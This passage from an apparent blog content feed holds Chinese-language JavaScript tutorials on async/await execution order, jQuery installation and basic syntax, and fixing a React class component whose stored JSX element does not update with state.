class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0</span><span class="token comment">// 2</span><span class="token comment">// 6</span><span class="token comment">// 1</span><span class="token comment">// 3</span><span class="token comment">// 5（1 秒后）</span><span class="token comment">// 4（再等 1 秒后）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也许会疑惑，不是说 async 函数会等到 await 返回结果后再继续执行吗，为何就先输出 6 了？其实不要混淆概念，确实 async 函数内部是这样干的（3 后 1秒输出 5、4），但 async 函数它自身执行时依然是正常的同步任务执行，也就是虽然内部的 async 函数会等待其 await 返回结果才继续执行后面的代码，但外部的 async 函数可不会等待内部的那个 await，会照常执行（你不是我的菜，天涯何处无芳草╮(╯▽╰)╭）；</p><p>如果确实需要等待这个嵌套的 async 函数执行完再执行剩下的代码，那么前面加个 await 就行了，原理是也是可行的，因为 async 函数就是返回的一个 Promise 函数，代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0</span><span class="token comment">// 2</span><span class="token comment">// 1</span><span class="token comment">// 3</span><span class="token comment">// 5（1 秒后）</span><span class="token comment">// 6</span><span class="token comment">// 4（再等 1 秒后）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里也要 <strong>注意</strong>，假如嵌套的 async 函数中的 await 不返回结果，并且没有在嵌套的 async 函数前面添加 await，那么外部的 async 函数内部剩余的代码也不会执行；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> asnyc await 异步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery 初识之安装与语法简介</title>
      <link href="/2024/09/27/javascript/jquery-chu-shi-zhi-an-zhuang-yu-yu-fa-jian-jie/"/>
      <url>/2024/09/27/javascript/jquery-chu-shi-zhi-an-zhuang-yu-yu-fa-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>jQuery是一个JavaScript<strong>函数库</strong>，是一个比较流行的<strong>js框架</strong>，功能就是简化 js 代码的书写，因为一些功能用原生javascript书写代码量是很大的。可以理解为<strong>javascript query</strong>，毕竟Query也是它的一个功能。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>要使用jQuery库，可以从网上下载得到jQuery的 <code>.js</code> 文件，也可以使用**CDN (Content Delivery Content 内容分发网络)**加载jQuery。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>需要去jQuery官网：<a href="http://jquery.com/">jquery.com</a> 下载需要的jQuery库，一般有两个版本，<code>production</code> 表示已被压缩精简的版本，用于放到实际网站中，<code>development</code> 表示测试开发版，用于编写和开发，是<strong>可读</strong>的代码。</p><p>例如目前最新的版本是 <code>jquery-3.3.1.js</code>，压缩版后缀是 <code>.min.js</code>，开发版文件有一万多行，就是正常格式的JavaScript源代码，包含一些注释，文件大小为 <code>266k</code>；压缩版就是去掉里面不必要的<strong>空格</strong>，<strong>回车</strong>与<strong>注释</strong>，所以最后文件实际内容只有<strong>一行！</strong>，文件大小为 <code>85k</code>，压缩了近<strong>三倍</strong>，这也是网页都使用压缩版，提升网页性能的原因。</p><p>下载好后放到网页文件夹中，然后使用 <code>&lt;script&gt;</code> 标签引用，例如：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">scr</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/jquery-3.3.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>路径中填写 <code>.js</code> 文件的实际存放位置。</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>使用CDN（内容分发网络）就可以不用下载jQuery文件，优点是可以使用这个机制尽量避开网络中一些影响数据传输的路线，提高访问速度和稳定性。原理就是使用在各处配置的<strong>节点服务器</strong>，让用户就近获取所需内容。</p><p>常见CDN有很多，例如百度、新浪、谷歌、微软等，如果是国内站点的话，建议使用国内CDN，国外站点可以使用谷歌或微软，提高速度。</p><p>以百度CDN为例，安装方法如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>微软CDN：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://ajax.microsoft.com/ajax/jquery/jquery-1.3.2.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>微软jQuery历史版本可以从这里查看<a href="https://docs.microsoft.com/en-us/aspnet/ajax/cdn/overview#jQuery_Releases_on_the_CDN_0">https://docs.microsoft.com/en-us/aspnet/ajax/cdn/overview#jQuery_Releases_on_the_CDN_0</a>。</p><p>更多内容可以访问<strong>百度静态资源公共库</strong><a href="http://cdn.code.baidu.com/">(http://cdn.code.baidu.com/)</a>，其他CDN可以自行百度搜索。</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>jQuery的基础语法是通过<strong>选取（query）</strong>文档中的元素，对其进行<strong>操作（action）</strong>，语法是：</p><p><code>$(selector).action()</code></p><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p><code>selector</code> 是选择器，类似于<strong>CSS选择器</strong>，常见的有：</p><ul><li>元素选择器，如： <code>$(&quot;p&quot;)</code></li><li>ID选择器，如：<code>$(&quot;#myId&quot;)</code></li><li>类选择器，如：<code>$(&quot;.myClass&quot;)</code></li><li>属性选择器，如：<code>$(&quot;[href]&quot;)</code></li></ul><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p><code>action()</code> 是对所选元素执行的操作，例如：</p><ul><li>隐藏元素：<code>.hide()</code></li><li>单击事件：<code>.click(myFunction())</code></li><li>双击：<code>.dblclick()</code></li><li>悬停：<code>.hover()</code></li></ul><p>其他语法与JavaScript类似，代码写在 <code>&lt;script&gt;</code> 中，例如隐藏 p 元素：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>有时需要等文档加载完毕后执行代码，很像JavaScript中的 <code>window.onload</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>jQuery中就要这么写：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>简化写法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结果都是在整个文档加载完后执行语句。</p><h2 id="方法链接"><a href="#方法链接" class="headerlink" title="方法链接"></a>方法链接</h2><p>相对于JavaScript，jQuery又一种特殊的操作方法叫做<strong>方法链接（chaining）</strong>，即在一条语句上，对一个元素执行多个操作，语法是：<br><code>$(selector).action1().action2().action3()</code></p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"&lt;b>Hello&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结果就是改变元素文本内容后绑定点击事件的调用函数，操作可以绑定多个，并且是<strong>依次执行</strong>，方法类似，其他操作以此类推。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jquery语法 jQueryCDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次 React 组件无法更新状态值的问题分析与解决</title>
      <link href="/2024/09/27/javascript/ji-yi-ci-react-zu-jian-wu-fa-geng-xin-zhuang-tai-zhi-de-wen-ti-fen-xi-yu-jie-jue/"/>
      <url>/2024/09/27/javascript/ji-yi-ci-react-zu-jian-wu-fa-geng-xin-zhuang-tai-zhi-de-wen-ti-fen-xi-yu-jie-jue/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>React 组件中通过直接声明的元素变量（<code>jsx</code> 写法），在访问 <code>state</code> 中指定的状态值时，如果状态发生改变，使用状态值的元素内容无法得到相应更新；</p><p>下面的例子中，直接在 class 组件中声明元素变量 <code>myDiv</code>，并且需要访问 <code>this.state</code> 中的数据，最终对状态值进行展示，按钮用于改变状态值：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>  state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    myDiv <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>    <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'world'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>myDiv<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">          change        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按理说点击按钮后，状态发生改变（<code>this.state.msg</code>），页面的值会发生相应更新，但是页面内容并未发生相应改变，这其实是一个微小的细节问题，下面对其进行展开分析；</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>上例中，在组件中直接声明了值为元素的一个变量 <code>myDiv</code>，并且其内容调用了状态值（<code>this.state.msg</code>），其实该变量在声明时状态内容直接被赋予了 <code>this.state.msg</code> 的<strong>当前值</strong>，并非想象中的<strong>引用值</strong>，然后状态改变（<code>this.setState()</code>）时，React 会重新调用组件的 <code>render()</code> 方法，重新渲染组件内容，但是此时该变量中的状态值仍是之前被赋予的字面值，不会再访问一次当前的 <code>state</code>，所以其值最终也就不会发生相应的改变；</p><p>并且在一般的写法中，涉及访问状态的逻辑（如 <code>&#123;this.state.msg&#125;</code>）一般都写在整个 <code>render()</code> 方法之中，这样每次状态的改变导致 <code>render</code> 方法重新执行，使得重新执行获取状态的逻辑，就能每次都访问到最新的状态值了；但有时又很难避免在复用组件时在 <code>render</code> 方法以外的地方访问 <code>state</code>，并期望数据被动态改变，这里就需要寻求其他解决方案；</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>我们可以使用 <code>getter</code> 方式来声明变量，<code>getter/setter</code> 方法是声明对象属性的一种方式，可以实现该对象指定属性的属性值的访问控制（<code>getter</code>）以及修改控制（<code>setter</code>），下面是一个简单的使用示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">num</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token keyword">get</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">set</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>obj<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getter</code> 声明的属性的特点是，每次调用对象的该属性，都会执行一次 <code>getter</code> 函数内的逻辑，然后返回 <code>return</code> 的值；所以如果把之前组件中的 <code>myDiv</code> 属性以 <code>get</code> 方式进行声明，这样每一次状态改变后，<code>render()</code> 方法重新执行，然后就会涉及对该变量的访问，导致重新执行 <code>getter</code> 方法中的逻辑，最后就能访问到改变后的状态值（<code>this.state.msg</code>），页面也就相应地更新了；</p><p>改造后的组件代码：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>  state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">get</span> <span class="token function">myDiv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'world'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>myDiv<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">          change        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>类似使用 <code>getter</code> 的思路，为了让每次状态改变，用到状态的变量也发生相应的更新，另一种方法就是将变量 <code>myDiv</code> 声明为<strong>函数</strong>类型，同样也能使每次获取变量时都重新执行一次获取状态的逻辑，以获取最新状态值，改造后代码如下：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>  state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function-variable function">myDiv</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">;</span>  <span class="token comment">// 或者是：</span>  <span class="token comment">// myDiv() &#123; return &lt;div>&#123;this.state.msg&#125;&lt;/div> &#125;;</span>    <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'world'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">myDiv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">          change        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不同之处就是每次调用变量 <code>myDiv</code> 时需要使用函数式调用（后面加一对括号），为了方便多处调用，显然方法一更有优势；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
